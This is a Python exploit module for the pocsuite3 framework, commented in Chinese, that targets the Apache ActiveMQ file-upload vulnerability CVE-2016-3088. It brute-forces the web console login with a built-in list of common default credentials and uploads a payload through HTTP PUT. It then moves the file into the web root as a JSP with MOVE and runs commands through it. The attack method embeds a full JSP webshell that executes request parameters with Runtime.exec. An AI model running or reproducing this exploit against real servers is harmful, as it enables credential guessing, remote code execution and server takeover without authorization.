#!/usr/bin/env python
#coding=utf-8
import base64
import random
from threading import Thread
from string import ascii_letters
import urllib
import re
import socket
# ref: https://stackoverflow.com/questions/2719017/how-to-set-timeout-on-pythons-socket-recv-method
import select
from collections import OrderedDict
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
#from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger, OptDict
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

'''
先进行密码爆破，然后上传文件，因为最后访问还是需要登录的

https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md
两种方法：
1、上传webshell，条件：需要知道web绝对路径，且访问/admin/test/index.jsp需要登录，且访问webshell也需要登录；
2、写入crontab，条件：linux平台，且ActiveMQ以root权限启动
'''
class ActiveMQ_put_POC(POCBase):
    vulID = 'ActiveMQ-put'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'ActiveMQ'
    appVersion = 'Apache ActiveMQ 5.x < 5.14.0'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE
    vulDate = '2020-05-12'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-05-12'  # 编写 PoC 的日期
    updateDate = '2021-04-15'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://github.com/chaitin/xray/blob/master/pocs/activemq-cve-2016-3088.yml']  # 漏洞地址来源,0day不用写
    name = 'ActiveMQ文件上传漏洞(CVE-2016-3088)'  # PoC 名称
    cvss = u"高危"


    BANNER = ''.join([random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10)])


    def _verify(self, p_payload=BANNER, p_cmd=''):
        result={}

        vul_url = self.url
        target_url = vul_url

        host, port = url2ip(target_url, True)

        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 	

        admin_url       = vul_url + '/admin/'
        self.active_home_url =  'GET /admin/test/index.jsp HTTP/1.1\r\n'    # 得到activemq.home的值

        # 传入True参数，得到host和port，参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/lib/utils/__init__.py
        host, port = url2ip(target_url, True)

        # 每个请求都加上的Header
        self.other_headers = 'Host: {0}:{1}\r\nConnection: close\r\n'.format(host, port)

        self.content_lenth = 'Content-Length: {0}\r\n'.format(len(self.BANNER))    # PUT方法必需的，这个长度关系到服务端接收多长的上传字符串。参考：https://github.com/psf/requests/issues/1050

        self.PUT_url = 'PUT /fileserver/{0}.txt HTTP/1.1\r\n'.format(self.BANNER)
        self.MOV_url = 'MOVE /fileserver/{0}.txt HTTP/1.1\r\n'.format(self.BANNER)
        # 这一步要进行url编码，否则响应400
        self.GET_upload_url = 'GET /api/{0}.jsp?cmd={1} HTTP/1.1\r\n'.format(self.BANNER, urllib.parse.quote(p_cmd))

        #active_home = '/home/77/repos/apache-activemq-5.11.1'
        self.DES_header = ''    #Destination: file://{0}/webapps/api/{1}.jsp\r\n'.format(active_home, self.BANNER)    #TODO

        # 包含了空用户名/空密码的情况。这时候任何用户名密码都可以登录成功
        usernames = ['admin', 'test', '', 'root', 'activemq', 'ActiveMQ']
        passwords = ['123456', 'admin', 'root', 'password', '123123', '123', '1', '',
                    'P@ssw0rd!!', 'qwa123', '12345678', 'test', '123qwe!@#',
                    '123456789', '123321', '1314520', '666666', 'woaini', 'fuckyou', '000000',
                    '1234567890', '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456',
                    '1q2w3e4r', '123qwe', '159357', 'p@ssw0rd', 'p@55w0rd', 'password!',
                    'p@ssw0rd!', 'password1', 'r00t', 'system', '111111', 'activemq', 
                    'ActiveMQ', 's3cret', '1qaz2wsx', 'qwer!@#$', 'qwer1234']

        # 默认用户名密码
        self.real_user = 'admin'
        self.real_pass = 'admin'


        try:
            self.flag = False  # 初始化

            threads = []
           
            # 空密码的时候响应4开头，需要爆破才爆破
            if self.is_need_crack(host, port):
                logger.info("需要爆破!")
                for username in usernames:
                    for password in passwords:
                        _thread = Thread(target=self.validate, args=(host, port, username, password))
                        _thread.start()
                        threads.append(_thread)
            # 若不需要爆破，则直接设置flag
            else:
                logger.info("不需要爆破!")
                self.flag = True

            if threads:
                logger.info("处理线程")
                # 等待所有线程完成
                for t in threads:
                    t.join()


            # 状态码为200，则认为密码已经爆破出来，才继续后面的文件上传尝试，否则没有意义，即便上传了也无法访问。
            if self.flag:
                active_home = self.get_active_home_path(host, port, self.real_user, self.real_pass)
                self.DES_header = 'Destination: file://{0}/webapps/api/{1}.jsp\r\n'.format(active_home, self.BANNER)
                # 前两步不需要认证
                logger.info("step1_put")
                if self.step1_put(host, port, p_payload):
                    logger.info("step2_mov")
                    if self.step2_mov(host, port):
                        # 第三步需要认证
                        logger.info("step3_get")
                        resp = self.step3_get(host, port, self.real_user, self.real_pass)
                        if resp:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = target_url
                            result['VerifyInfo']['user'] = self.real_user
                            result['VerifyInfo']['pass'] = self.real_pass
                            result['VerifyInfo']['resp'] = resp
                            if p_cmd:
                                result['VerifyInfo']['command'] = p_cmd
                            return self.save_output(result)
            else:
                logger.info("爆破失败!")
                
                
        except Exception as e:
            print(e)

        
        return self.save_output(result)


    # 攻击模块
    # 参考：https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/ecshop_rce.py
    def _attack(self):
        webshell_content = '''
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="my_webshell_form" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
        '''
        cmd = self.get_option("command")
        result = dict()
        result['Stdout'] = self._verify(webshell_content, cmd)
        return self.save_output(result)


    def _options(self):
        o = OrderedDict()
        o["command"] = OptDict(selected="bash")
        return o


    def auth(self, p_user, p_pass):
        tmp = p_user + ':' + p_pass
        auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
        headers = 'Authorization: Basic'+' '+auth
        return headers


    # 爆破用户名密码
    def validate(self, host, port, username, password):
        s=self.new_socket(host, port)

        header1 = "GET /admin/ HTTP/1.1\r\n"    # 访问这个页面需要认证
        header2 = "Host: {0}:{1}\r\n".format(host, port)
        header3 = "Connection: close\r\n"
        #auth = "Authorization: Basic YWRtaW46YWRtaW4="
        auth = self.auth(username, password)
        payload = header1 + header2 + header3 + auth + "\r\n\r\n"
        #print(payload)
        s.send(payload.encode())

        data=s.recv(1024)

        data = data.decode("utf-8")
        #print(data[9:12])   # HTTP状态码
        if data[9] == '2':  # 响应2开头的状态码
            logger.info("Success\nuser: {0}\t pass: {1}".format(username, password))
            self.flag = True
            self.real_user = username
            self.real_pass = password
            return
        elif data[9] == '4':
            #print("Fail")
            pass


    # 判断是否需要爆破（若响应4开头才需要爆破）
    def is_need_crack(self, host, port):
        s=self.new_socket(host, port)

        header1 = "GET /admin/ HTTP/1.1\r\n"    # 访问这个页面需要认证
        header2 = "Host: {0}:{1}\r\n".format(host, port)
        header3 = "Connection: close\r\n\r\n"
        payload = header1 + header2 + header3
        logger.info(payload)
        s.send(payload.encode())

        # 设置recv的超时时间为5，下面代码代表等待5s，或者数据来临
        s.setblocking(0)
        ready = select.select([s], [], [], 5)

        if ready[0]:
            data=s.recv(1024)

            data = data.decode("utf-8")
            #print(data[9:12])   # HTTP状态码
            logger.info(data)

            if data[9] == '4' and 'ActiveMQRealm' in data:  # 响应4开头的状态码，则存在对ActiveMQ的basic认证提示
                return True

        return False


    # 拿到ActiveMQ的web绝对路径，作为文件上传时的路径
    def get_active_home_path(self, host, port, username, password):
        active_home_path = ''
        s=self.new_socket(host, port)

        auth = self.auth(username, password)
        payload = self.active_home_url + self.other_headers + auth + "\r\n\r\n"
        #print(payload)
        s.send(payload.encode())

        data = ''
        #data=s.recv(4092)    # 2048个字节不够大，不稳定，导致出错！（认为在响应的前2048字节会出现需要的内容）

        while True:
            buf = s.recv(1024)
            if not buf:
                logger.info("Received!")
                break
            # 忽略错误：https://www.cnblogs.com/zz22--/p/8799071.html
            data += buf.decode(errors='ignore')


        logger.info("get_active_home_path")
        #logger.info(data)
        findword=r'activemq\.home=(.*?), '
        #findword=u"activemq\.home=.{100}"   #需要查找的特定中文字符串(认为最多100个字符串长度)
        pattern = re.compile(findword) 

        # 在返回的响应中查找
        results =  pattern.findall(data)
        logger.info(results)
        active_home_path = results[0]

        return active_home_path



    '''
    PUT /fileserver/asdf.txt HTTP/1.1
    Host: 192.168.85.129:8161
    Connection: close
    
    <webshell>
    '''
    def step1_put(self, host, port, p_payload=BANNER):
        s=self.new_socket(host, port)

        # 这个长度关系到服务端接收多长的上传字符串
        payload = self.PUT_url + 'Content-Length: {0}\r\n'.format(len(p_payload))   + self.other_headers +  "\r\n" + p_payload  + '\r\n\r\n'
        #print(payload)
        s.send(payload.encode())

        data=s.recv(1024)

        data = data.decode("utf-8")
        #print(data[9:12])   # HTTP状态码
        if data[9] == '2':  # 响应2开头的状态码
            return True
        return False  


    '''
    MOVE /fileserver/asdf.txt HTTP/1.1
    Destination: file:///home/77/repos/apache-activemq-5.11.1/webapps/api/asdf.jsp
    Host: 192.168.85.129:8161
    Connection: close
    '''
    def step2_mov(self, host, port):
        s=self.new_socket(host, port)

        payload = self.MOV_url + self.DES_header + self.other_headers + "\r\n"
        #print(payload)
        s.send(payload.encode())

        data=s.recv(1024)

        data = data.decode("utf-8")
        #print(data[9:12])   # HTTP状态码
        if data[9] == '2':  # 响应2开头的状态码
            return True
        return False 


    '''
    GET /api/asdf.jsp HTTP/1.1
    Host: 192.168.85.129:8161
    Authorization: Basic YWRtaW46YWRtaW4=
    Connection: close
    '''
    def step3_get(self, host, port, username, password):
        s=self.new_socket(host, port)

        auth = self.auth(username, password)
        payload = self.GET_upload_url  + self.other_headers + auth + "\r\n\r\n"
        print(payload)
        s.send(payload.encode())

        data = ''

        while True:
            buf = s.recv(1024)
            if not buf:
                logger.info("Received!")
                break
            # 忽略错误：https://www.cnblogs.com/zz22--/p/8799071.html
            data += buf.decode(errors='ignore')

        logger.info(data)
        logger.info("状态码")
        logger.info(data[9-11])
        if data[9] == '2':  # 响应2开头的状态码
            return data
        return False 


    def test_banner(self, host, port):
        s = self.new_socket(host, port)
        header1 = "GET / HTTP/1.1\r\n"    # 访问这个页面需要认证
        header2 = "Host: {0}:{1}\r\n".format(host, port)
        header3 = "Connection: close\r\n\r\n"
        payload = header1 + header2 + header3
        #print(payload)
        s.send(payload.encode())
        
        data=s.recv(2048)
        data = data.decode("utf-8")
        #print(data[9:12])   # HTTP状态码
        if "Apache ActiveMQ" in data or "ActiveMQRealm" in data:  # ActiveMQ的标志
            return True
        return False


    def new_socket(self, host, port):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(5)
        s.connect((host,port))
        return s


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            output.show_result()
        else:
            output.fail()
        return output

register_poc(ActiveMQ_put_POC)
